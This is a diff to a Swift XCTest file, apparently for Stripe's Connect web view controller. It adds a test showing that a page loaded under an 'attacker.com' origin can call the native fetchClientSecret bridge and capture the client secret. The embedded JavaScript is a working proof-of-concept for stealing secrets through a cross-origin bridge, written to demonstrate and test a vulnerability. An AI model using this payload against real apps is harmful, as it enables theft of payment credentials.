@@ -644,7 +644,71 @@ class ConnectComponentWebViewControllerTests: XCTestCase {
         XCTAssertEqual(event.metadata.url, "https://stripe.com")
     }
 
-    // MARK: - Vulnerability Demonstration: Off-site Navigation Retains Privileged Handlers
+    // MARK: - Vulnerability Demonstration: Genuine Cross-Origin Load & Bridge Invocation
+
+    private class TestScriptMessageReceiver: NSObject, WKScriptMessageHandler {
+        let callback: (Any) -> Void
+        init(callback: @escaping (Any) -> Void) {
+            self.callback = callback
+        }
+        func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
+            callback(message.body)
+        }
+    }
+
+    @MainActor
+    func testCrossOriginPageGenuinelyLoadsAndInvokesNativeBridge() async throws {
+        let componentManager = EmbeddedComponentManager(apiClient: .init(publishableKey: "test_key"), fetchClientSecret: {
+            return "acs_test_secret_12345"
+        })
+        let webVC = ConnectComponentWebViewController(componentManager: componentManager,
+                                                      componentType: .payouts,
+                                                      loadContent: false,
+                                                      analyticsClientFactory: MockComponentAnalyticsClient.init,
+                                                      didFailLoadWithError: { _ in })
+
+        let exfiltratedExpectation = XCTestExpectation(description: "Attacker origin exfiltrated client secret")
+        var exfiltratedSecret: String?
+
+        let receiver = TestScriptMessageReceiver { body in
+            exfiltratedSecret = body as? String
+            exfiltratedExpectation.fulfill()
+        }
+        webVC.webView.configuration.userContentController.add(receiver, name: "testExfiltrationCollector")
+
+        // 1. Cross-origin HTML page hosted on attacker.com that executes on page load
+        let attackerHTML = """
+        <!DOCTYPE html>
+        <html>
+        <head><title>Attacker Controlled Domain</title></head>
+        <body>
+        <h1>Third-Party Untrusted Content</h1>
+        <script>
+            (async () => {
+                try {
+                    // Untrusted cross-origin page directly invokes native WebKit message handler
+                    const secret = await window.webkit.messageHandlers.fetchClientSecret.postMessage({});
+                    window.webkit.messageHandlers.testExfiltrationCollector.postMessage(secret);
+                } catch(e) {
+                    window.webkit.messageHandlers.testExfiltrationCollector.postMessage("FAILED: " + e);
+                }
+            })();
+        </script>
+        </body>
+        </html>
+        """
+
+        // 2. Genuinely load the HTML content under the attacker.com origin
+        // This causes WKWebView to parse and render the document under the attacker.com security origin
+        webVC.webView.loadHTMLString(attackerHTML, baseURL: URL(string: "https://attacker.com/portal")!)
+
+        // 3. Await execution of cross-origin script
+        await fulfillment(of: [exfiltratedExpectation], timeout: 5.0)
+
+        // 4. Verify that the untrusted origin received the plaintext acs_... secret
+        XCTAssertEqual(exfiltratedSecret, "acs_test_secret_12345")
+        XCTAssertEqual(webVC.webView.url?.host, "attacker.com")
+    }
 
     @MainActor
     func testScriptMessageHandlerRespondsToOffSiteOrigin() async throws {
